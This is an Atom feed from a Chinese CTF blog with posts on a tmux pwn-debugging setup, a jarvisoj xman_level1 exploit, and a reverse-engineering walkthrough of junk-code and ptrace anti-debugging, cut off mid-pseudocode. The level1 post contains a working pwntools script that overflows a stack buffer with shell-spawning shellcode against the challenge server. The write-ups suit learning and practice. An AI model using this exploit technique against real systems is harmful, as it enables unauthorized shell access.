<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0x14&#39;s Blog | 热爱分享</title>
  
  <subtitle>0x14</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.yof3ng.xyz/"/>
  <updated>2020-04-15T14:29:40.372Z</updated>
  <id>http://www.yof3ng.xyz/</id>
  
  <author>
    <name>0x14</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Pwn With Tmux In Docker</title>
    <link href="http://www.yof3ng.xyz/2019/12/30/Tmux_Docker_Env/"/>
    <id>http://www.yof3ng.xyz/2019/12/30/Tmux_Docker_Env/</id>
    <published>2019-12-30T13:16:30.000Z</published>
    <updated>2020-04-15T14:29:40.372Z</updated>
    
    <content type="html"><![CDATA[<p>Tmux_Docker_Env（Docker下的Pwn调试环境）..</p><a id="more"></a><p>[toc]</p><h1 id="Tmux-Docker-Env（Docker下的Pwn调试环境）"><a href="#Tmux-Docker-Env（Docker下的Pwn调试环境）" class="headerlink" title="Tmux_Docker_Env（Docker下的Pwn调试环境）"></a>Tmux_Docker_Env（Docker下的Pwn调试环境）</h1><blockquote><p>  如果不想使用虚拟机大杀器（实在是捡的mac内存小，硬盘小）来做题，追求极简主义，那么在Docker环境下，大部分情况只能使用shell，而不能使用桌面化的终端，那么你就可能会在做Pwn题的时候遇到<code>gdb.attach(p)</code>无法使用的情况了。</p></blockquote><h2 id="解决方法–-gt-Tmux"><a href="#解决方法–-gt-Tmux" class="headerlink" title="解决方法–&gt;Tmux"></a>解决方法–&gt;Tmux</h2><blockquote><p>  Tmux终端复用神器！</p></blockquote><p>这里采用的是<code>kitematic Docker管理工具</code>+ <code>ubuntu 16.04 images</code> + <code>Tmux terminal</code>环境。</p><p><code>kitematic + ubuntu16.04 Container:</code></p><p><img src="./images/kitematic.png" alt="kitematic"></p><p><code>安装Tmux:</code></p><pre class=" language-bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> tmux</code></pre><p><code>配置Tmux (~/.tmux.conf)，新版本中只需 set -g mouse on即可添加鼠标操控功能:</code></p><pre class=" language-bash"><code class="language-bash"> ⚡  ~  <span class="token function">cat</span> .tmux.conf <span class="token keyword">set</span> -g history-limit 5000<span class="token keyword">set</span> -g mouse on</code></pre><p><code>注意：如果想使用xterm256配色，需要使用-2参数启动（如果不加-2的话，配色体验不太好）:</code></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#.zshrc Add</span>tmux <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span></code></pre><p><code>然后就能不用打开虚拟机就愉快地进行调试了:</code></p><p><code>helloworld.c</code></p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> b <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> hello<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token operator">+</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>hello<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>hello<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><code>test.py</code></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./helloworld'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print("done")</span><span class="token comment" spellcheck="true">#p.interactive()</span><span class="token comment" spellcheck="true">#gdb.attach(p,gdbscript="b printf")</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1234'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#pause()</span><span class="token comment" spellcheck="true">#p.recvall()</span></code></pre><p><code>demo</code></p><p><img src="/Users/0x14/Documents/Daily_record/images/show.png" alt="show"></p><h2 id="常用命令-lt-–Tmux"><a href="#常用命令-lt-–Tmux" class="headerlink" title="常用命令&lt;–Tmux"></a>常用命令&lt;–Tmux</h2><p><code>mac复制</code>：按住<code>fn</code>键选中内容，<code>command + c</code>即可。</p><p><a href="http://www.ruanyifeng.com/blog/2019/10/tmux.html" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2019/10/tmux.html</a></p><p><a href="https://linux.cn/article-10480-1.html" target="_blank" rel="noopener">https://linux.cn/article-10480-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Tmux_Docker_Env（Docker下的Pwn调试环境）..&lt;/p&gt;
    
    </summary>
    
      <category term="binary" scheme="http://www.yof3ng.xyz/categories/binary/"/>
    
    
      <category term="pwn" scheme="http://www.yof3ng.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>jarvisoj_xmanlevel1</title>
    <link href="http://www.yof3ng.xyz/2019/10/22/jarvisoj-xmanlevel1/"/>
    <id>http://www.yof3ng.xyz/2019/10/22/jarvisoj-xmanlevel1/</id>
    <published>2019-10-22T13:16:30.000Z</published>
    <updated>2019-10-22T13:49:11.125Z</updated>
    
    <content type="html"><![CDATA[<p>xman_level1 of jarvisoj…pwn practice.</p><a id="more"></a><h1 id="xman-level1"><a href="#xman-level1" class="headerlink" title="xman_level1"></a>xman_level1</h1><p>栈可执行，无栈溢出防护。</p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> checksec<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/root/ctf/level1'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span>    RWX:      Has RWX segments</code></pre><p>简单分析可得此题是栈溢出+栈上执行shellcode：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20191022213119.png" alt=""></p><p>buf大小为0x88，因此可以直接写脚本：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'pwn2.jarvisoj.com'</span><span class="token punctuation">,</span> <span class="token number">9877</span><span class="token punctuation">)</span>line1 <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>buf_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>line1<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token string">'\x90'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>buf_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20191022214508.png" alt=""></p><blockquote><p>  <code>x86</code>下可以通过最左边的参数（栈顶），不断指针的移动来判断出其他的参数的值（可变参数），因为x86下，参数储存的位置是连续的。注意是4字节对齐（最小为4字节）。</p><p>  <code>x64</code>下面在x64下函数调用的前4个参数总是放在寄存器中传递，剩余的参数则压入堆栈中。而x86上则是全部压入堆栈中(除了fastcall方式)。</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;xman_level1 of jarvisoj…pwn practice.&lt;/p&gt;
    
    </summary>
    
      <category term="binary" scheme="http://www.yof3ng.xyz/categories/binary/"/>
    
    
      <category term="pwn" scheme="http://www.yof3ng.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>flodbg_junkcode</title>
    <link href="http://www.yof3ng.xyz/2019/10/21/flodbg-junkcode/"/>
    <id>http://www.yof3ng.xyz/2019/10/21/flodbg-junkcode/</id>
    <published>2019-10-21T04:37:54.000Z</published>
    <updated>2019-10-21T07:59:35.558Z</updated>
    
    <content type="html"><![CDATA[<p>巅峰极客逆向flodbg：花指令，_ptrace反调试……</p><a id="more"></a><p>[TOC]</p><h1 id="巅峰极客-–-Re-flodbg"><a href="#巅峰极客-–-Re-flodbg" class="headerlink" title="巅峰极客 – Re.flodbg"></a>巅峰极客 – Re.flodbg</h1><blockquote><p>此题涉及花指令，ptrace反调试等知识。</p></blockquote><h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><p>花指令是企图隐藏掉不想被逆向工程的代码块(或其它功能)的一种方法。由<a href="https://baike.baidu.com/item/%E8%AE%BE%E8%AE%A1%E8%80%85/514381" target="_blank" rel="noopener">设计者</a>特别构思，希望使<a href="https://baike.baidu.com/item/%E5%8F%8D%E6%B1%87%E7%BC%96/10858476" target="_blank" rel="noopener">反汇编</a>的时候出错，让破解者无法清楚正确地<a href="https://baike.baidu.com/item/%E5%8F%8D%E6%B1%87%E7%BC%96%E7%A8%8B%E5%BA%8F" target="_blank" rel="noopener">反汇编程序</a>的内容，迷失方向。经典的是，目标位置是另一条指令的中间，这样在反汇编的时候便会出现混乱。花指令有可能利用各种指令：<a href="https://baike.baidu.com/item/jmp/2149772" target="_blank" rel="noopener">jmp</a>, call, ret的一些<a href="https://baike.baidu.com/item/%E5%A0%86%E6%A0%88/1682032" target="_blank" rel="noopener">堆栈</a>技巧，位置运算，等等。</p><p><a href="https://blog.csdn.net/whklhhhh/article/details/88677670" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/details/88677670</a></p><p><a href="https://wizardforcel.gitbooks.io/re-for-beginners/Part-III/Chapter-50.html" target="_blank" rel="noopener">https://wizardforcel.gitbooks.io/re-for-beginners/Part-III/Chapter-50.html</a></p><h2 id="Ptrace反调试"><a href="#Ptrace反调试" class="headerlink" title="Ptrace反调试"></a>Ptrace反调试</h2><p><a href="https://blog.csdn.net/whklhhhh/article/details/88882049" target="_blank" rel="noopener">https://blog.csdn.net/whklhhhh/article/details/88882049</a></p><blockquote><p>Linux<br>通过ptrace系统调用来调试子进程<br>对于create类型，与正常创建子进程工序相同，通过fork创建子进程后使用traceme来告知内核它需要被调试，这样等到exec执行的时候内核就会产生SIGTRAP，此时调用wait的父进程就会接收到这个信号并ptrace子进程，从而使得调试优先于子进程的所有内容<br>而对于attach类型，是父进程直接使用ptrace去调试其他进程，如果此时子进程已经被调试那么就会报错</p><p>Windows<br>通过调试对象（或者说是API）来进行通信<br>Windows系统的复杂度比Linux高很多，所以调试相关的东西对于用户态来说基本都是API来操作<br>对于create类型，父进程CreateProcess时直接传入DEBUG_PROCESS的标志即可<br>对于attach类型，则是调用DebugActiveProcess的API来实现的</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ptrace</span><span class="token punctuation">(</span>PTRACE_TRACEME<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"This process is being traced!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>在本题中：</p><pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ptrace</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v5 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">-</span> v4<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">func3</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v10<span class="token punctuation">,</span> <span class="token number">2LL</span><span class="token punctuation">,</span> <span class="token number">7LL</span><span class="token punctuation">,</span> <span class="token number">14LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v7 <span class="token operator">=</span> <span class="token number">4196782LL</span><span class="token punctuation">;</span>      <span class="token function">JUMPOUT</span><span class="token punctuation">(</span>__CS__<span class="token punctuation">,</span> v8 <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">exit</span><span class="token punctuation">(</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p><code>JUMPOUT</code>是受花指令影响导致IDA无法正常反编译的情况。</p><p>编写<code>idapython script</code>去除重复出现的一些无效指令：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ida_bytes <span class="token keyword">import</span> get_bytes<span class="token punctuation">,</span>patch_bytesaddr <span class="token operator">=</span><span class="token number">0x4009A4</span>end <span class="token operator">=</span> <span class="token number">0x400C51</span>pattern1 <span class="token operator">=</span> <span class="token string">"EBFFC0FFC8"</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>pattern2 <span class="token operator">=</span> <span class="token string">"E8 00 00 00 00 58 48 83 C0 0A FF E0 EB EB EB"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>pattern3 <span class="token operator">=</span> <span class="token string">"E8 00 00 00 00 5B 48 83 C3 0A FF E3 EB EB EB"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>pattern4 <span class="token operator">=</span> <span class="token string">"66 B8 EB 05 31 C0 74 FA EB"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>pattern5 <span class="token operator">=</span> <span class="token string">"E8 00 00 00 00 58 48 83 C0 0C FF E0 EB EB EB EB EB"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(pattern2)</span>buf_hex <span class="token operator">=</span> get_bytes<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>end <span class="token operator">-</span> addr<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>buf_hex <span class="token operator">=</span> buf_hex<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>pattern1<span class="token punctuation">,</span><span class="token string">'90'</span><span class="token operator">*</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>pattern1<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>buf_hex <span class="token operator">=</span> buf_hex<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>pattern2<span class="token punctuation">,</span><span class="token string">'90'</span><span class="token operator">*</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>pattern2<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>buf_hex <span class="token operator">=</span> buf_hex<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>pattern3<span class="token punctuation">,</span><span class="token string">'90'</span><span class="token operator">*</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>pattern3<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>buf_hex <span class="token operator">=</span> buf_hex<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>pattern4<span class="token punctuation">,</span><span class="token string">'90'</span><span class="token operator">*</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>pattern4<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>buf_hex <span class="token operator">=</span> buf_hex<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>pattern5<span class="token punctuation">,</span><span class="token string">'90'</span><span class="token operator">*</span><span class="token punctuation">(</span>len<span class="token punctuation">(</span>pattern5<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>buf <span class="token operator">=</span> buf_hex<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span>patch_bytes<span class="token punctuation">(</span>addr<span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span></code></pre><p>成功去花后的伪代码(ida tab键和f5有细微区别，使用f5重载伪代码），存在一堆反调试：</p><blockquote><ul><li>ptrace(trace_me) 当使用trace_me后进程即会进入被调试的状态，此时别的进程就无法主动附加</li><li>self/$pid/status</li><li>status中会显示tid、ppid等</li></ul></blockquote><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">int</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// er12</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// edi</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebp</span>  __pid_t v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  __pid_t v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// er13</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbx</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> v13<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ebx</span>  <span class="token keyword">int</span> v14<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-4D8h]</span>  <span class="token keyword">char</span> v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8h] [rbp-4D0h]</span>  <span class="token keyword">char</span> v16<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4CCh]</span>  <span class="token keyword">char</span> v17<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+14h] [rbp-4C4h]</span>  <span class="token keyword">char</span> v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-4B8h]</span>  <span class="token keyword">char</span> v19<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-4B4h]</span>  <span class="token keyword">char</span> v20<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-4B0h]</span>  <span class="token keyword">char</span> v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-4ACh]</span>  <span class="token keyword">char</span> v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+3Ch] [rbp-49Ch]</span>  <span class="token keyword">char</span> v23<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-498h]</span>  <span class="token keyword">char</span> v24<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4Ch] [rbp-48Ch]</span>  <span class="token keyword">int</span> v25<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+50h] [rbp-488h]</span>  <span class="token keyword">int</span> v26<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+54h] [rbp-484h]</span>  <span class="token keyword">int</span> v27<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+58h] [rbp-480h]</span>  <span class="token keyword">int</span> v28<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+5Ch] [rbp-47Ch]</span>  <span class="token keyword">int</span> v29<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+60h] [rbp-478h]</span>  <span class="token keyword">int</span> v30<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+64h] [rbp-474h]</span>  <span class="token keyword">int</span> v31<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+68h] [rbp-470h]</span>  <span class="token keyword">int</span> v32<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+6Ch] [rbp-46Ch]</span>  <span class="token keyword">int</span> v33<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+70h] [rbp-468h]</span>  <span class="token keyword">int</span> v34<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+74h] [rbp-464h]</span>  <span class="token keyword">int</span> v35<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+78h] [rbp-460h]</span>  <span class="token keyword">int</span> v36<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+7Ch] [rbp-45Ch]</span>  <span class="token keyword">int</span> v37<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+80h] [rbp-458h]</span>  <span class="token keyword">int</span> v38<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+84h] [rbp-454h]</span>  <span class="token keyword">int</span> v39<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+88h] [rbp-450h]</span>  <span class="token keyword">int</span> v40<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+8Ch] [rbp-44Ch]</span>  <span class="token keyword">int</span> v41<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+90h] [rbp-448h]</span>  <span class="token keyword">int</span> v42<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+94h] [rbp-444h]</span>  <span class="token keyword">int</span> v43<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+98h] [rbp-440h]</span>  <span class="token keyword">char</span> v44<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+A0h] [rbp-438h]</span>  <span class="token keyword">unsigned</span> __int64 v45<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4A8h] [rbp-30h]</span>  v3 <span class="token operator">=</span> v14<span class="token punctuation">;</span>  v45 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">{</span>    <span class="token operator">++</span>v3<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span>v3 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">_IO_getc</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v24 <span class="token punctuation">)</span><span class="token punctuation">;</span>  v25 <span class="token operator">=</span> <span class="token number">83</span><span class="token punctuation">;</span>  v26 <span class="token operator">=</span> <span class="token number">64</span><span class="token punctuation">;</span>  v27 <span class="token operator">=</span> <span class="token number">121</span><span class="token punctuation">;</span>  v28 <span class="token operator">=</span> <span class="token number">82</span><span class="token punctuation">;</span>  v29 <span class="token operator">=</span> <span class="token number">116</span><span class="token punctuation">;</span>  v30 <span class="token operator">=</span> <span class="token number">102</span><span class="token punctuation">;</span>  v31 <span class="token operator">=</span> <span class="token number">84</span><span class="token punctuation">;</span>  v32 <span class="token operator">=</span> <span class="token number">108</span><span class="token punctuation">;</span>  v33 <span class="token operator">=</span> <span class="token number">48</span><span class="token punctuation">;</span>  v34 <span class="token operator">=</span> <span class="token number">43</span><span class="token punctuation">;</span>  v35 <span class="token operator">=</span> <span class="token number">97</span><span class="token punctuation">;</span>  v36 <span class="token operator">=</span> <span class="token number">103</span><span class="token punctuation">;</span>  v37 <span class="token operator">=</span> <span class="token number">45</span><span class="token punctuation">;</span>  v38 <span class="token operator">=</span> <span class="token number">76</span><span class="token punctuation">;</span>  v39 <span class="token operator">=</span> <span class="token number">95</span><span class="token punctuation">;</span>  v40 <span class="token operator">=</span> <span class="token number">51</span><span class="token punctuation">;</span>  v41 <span class="token operator">=</span> <span class="token number">77</span><span class="token punctuation">;</span>  v42 <span class="token operator">=</span> <span class="token number">125</span><span class="token punctuation">;</span>  v43 <span class="token operator">=</span> <span class="token number">123</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">ptrace</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    v13 <span class="token operator">=</span> <span class="token number">10000000</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">{</span>      <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token operator">--</span>v13<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v13 <span class="token punctuation">)</span><span class="token 